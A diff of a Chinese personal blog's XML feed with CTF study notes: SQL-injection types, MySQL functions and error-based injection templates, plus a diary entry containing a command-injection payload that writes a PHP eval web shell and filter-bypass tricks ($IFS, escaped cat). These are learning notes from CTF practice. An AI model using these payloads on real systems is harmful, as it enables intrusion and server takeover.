@@ -4,11 +4,65 @@
   
   
   <entry>
-    <title>每日Todo列表(2021/01/19)</title>
+    <title>Ctfhub_SQL注入</title>
+    <link href="/2021/01/20/ctfhub-sqli/"/>
+    <url>/2021/01/20/ctfhub-sqli/</url>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-SQL注入的基础"><a class="header-anchor" href="#0x01-SQL注入的基础"></a>0x01 SQL注入的基础</h3><h4 id="1-注入类型"><a class="header-anchor" href="#1-注入类型"></a>1.注入类型</h4><ol><li>UNION query SQL injection  联合注入</li><li>Error-based SQL injiecttion 报错注入</li><li>Boolean-based blind SQL injection 布尔盲注</li><li>Time-based blind SQL injection   时间盲注</li><li>Stack queries SQL injection 堆叠注入</li></ol><h4 id="2-注入点类型"><a class="header-anchor" href="#2-注入点类型"></a>2.注入点类型</h4><ol><li>GET 数据</li><li>POST 数据</li><li>HTTP 请求报文</li><li>Cookie 数据</li></ol><h4 id="3-常用函数和参数"><a class="header-anchor" href="#3-常用函数和参数"></a>3.常用函数和参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs mysql">version()<br>database()<br>user()<br>current_user()<br>system_user()<br>@@datadir            #数据库路径  <br>@@version_compile_os #操作系统版本<br>length()<br>substring()<br>substr()<br>mid(String,start_local_1,)<br>left()<br>concat()          #没有分隔符<br>concat_ws()       #有分隔符<br>group_concat()    #连接一个组的字符串<br>ord()#返回ASCII码<br>ascii()#和ord相同<br>hex()#取16进制<br>unhex()#反<br>md5()#取md5<br>floor()#向下取整<br>round()#取4,5的整数<br>rand()#返回0-1之间的数字<br>load_file()#读取文件，返回字符串<br>sleep()#延迟<br>if(true,t,f)#if判断 如果成立执行t,不成立执行f<br>find_in_set()#返回字符串在字符串列表中的位置<br>benchmark()#指定语句执行的次数<br>name_const()#返回表结果<br></code></pre></td></tr></table></figure><h3 id="4-思路"><a class="header-anchor" href="#4-思路"></a>4.思路</h3><h4 id="前提是存在SQL注入"><a class="header-anchor" href="#前提是存在SQL注入"></a>前提是存在SQL注入</h4><hr><ol><li><strong>回显</strong> --&gt; <strong>联合查询</strong></li><li><strong>报错</strong> --&gt; <strong>报错注入</strong></li><li><strong>布尔类型状态</strong>–&gt; <strong>布尔注入and 延时注入</strong></li><li><strong>其他</strong> --&gt; <strong>Cookie注入</strong></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#报错注入<br>select count (*) from information _schema.tables group by concat ((此处加入执行语句),0x7e,floor (rand (0)*2));<br>select extractvalue (1,concat (0x7e,(此处加入执行语句),0x7e));<br>select updatexml (1,concat (0x7e,(此处加入执行语句),0x7e),1);<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>Web渗透</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>HTTP基础</title>
+    <link href="/2021/01/19/http-base/"/>
+    <url>/2021/01/19/http-base/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>HTTP基础</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>HTTP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Todo(2021/01/19-25)</title>
     <link href="/2021/01/19/Todo_1_19/"/>
     <url>/2021/01/19/Todo_1_19/</url>
     
-    <content type="html"><![CDATA[<h3 id="0x00-习惯的养成"><a class="header-anchor" href="#0x00-习惯的养成"></a>0x00 习惯的养成</h3><blockquote><p>早睡早起，锻炼身体，做TODO，让生活慢下来</p><p>专注的去做几件事</p><p>距离Ctf升降赛还有6天。</p></blockquote><h3 id="0x01-今天的小目标"><a class="header-anchor" href="#0x01-今天的小目标"></a>0x01 今天的小目标</h3><ul class="contains-task-list"><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 完成 Ctfhub 的信息泄露，密码口令 和 SQL注入</li><li class="task-list-item"><input class="task-list-item-checkbox" disabled="" type="checkbox"> 完成 Upload-labs 的训练和总结 ⟹ 总结出一篇文件上传的常用技巧</li><li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 信息泄露_Git+NU1L的SQL注入</li></ul>]]></content>
+    <content type="html"><![CDATA[<h3 id="0x00-习惯的养成"><a class="header-anchor" href="#0x00-习惯的养成"></a>0x00 习惯的养成</h3><blockquote><p>早睡早起，锻炼身体，做TODO，让生活慢下来</p><p>专注的去做几件事</p><p>距离Ctf升降赛还有0天。</p></blockquote><h3 id="0x01-今天的小目标"><a class="header-anchor" href="#0x01-今天的小目标"></a>0x01 今天的小目标</h3><ol><li>重要目标</li></ol><ul class="contains-task-list"><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Ctfhub 的信息泄露，密码口令 和 SQL注入</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Upload-labs 的训练和总结</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 信息泄露_Git+NU1L的SQL注入</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 完成 Sqli-labs 的训练和总结</p></li><li class="task-list-item"><p><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox"> 选拔赛</p></li></ul><h3 id="0x03-各种踩坑"><a class="header-anchor" href="#0x03-各种踩坑"></a>0x03 各种踩坑</h3><ol><li>kali有pyhton2和python3</li><li>dirsearch因为作者的原因出bug 回退上个版本</li><li>Githack 老版本不能获取.git文件夹，只针对.git存在的对象</li><li>Git 暂存区的概念 git stash 保存暂存区和工作区的进度/ git stash pop 恢复最新的进度到工作区。</li><li>git index是版本库</li></ol><h3 id="0X04-RCE远程执行"><a class="header-anchor" href="#0X04-RCE远程执行"></a>0X04 RCE远程执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">方法1：ls ../<br>方法2:127.0.0.1&amp;<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"&lt;?php @eval(\$_POST['ice']);?&gt;"</span> &gt; 111.php <br><span class="hljs-comment">#cat过滤</span><br>反斜杠 ： 例如  ca\t fl\ag.php<br>连接符： 例如   ca<span class="hljs-string">''</span>t fla<span class="hljs-string">''</span>g.txt<br><span class="hljs-comment">#空格过滤</span><br>&lt;,&lt;&gt;,%20(space),%09(tab),<span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>, <span class="hljs-variable">$&#123;IFS&#125;</span>,<span class="hljs-variable">$IFS</span><br><span class="hljs-comment">#分隔符可以使用%0a代替</span><br>若直接使用文本框上传命令会导致字符被转义，直接访问URL<br></code></pre></td></tr></table></figure><h3 id="0X05-短暂的结果"><a class="header-anchor" href="#0X05-短暂的结果"></a>0X05 短暂的结果</h3><p>QAQ真刺激啊这比赛,第7就是我了。</p><p>PS:😅好多原题没做出来，有种考研数学一的味道了，每天做点题，做题实在是太少了。</p><p><img src="https://qaq233.oss-cn-hongkong.aliyuncs.com/POST/ctf/hbca_ctf_1.png" srcset="/img/loading.gif" alt=""></p>]]></content>
     
     
     <categories>
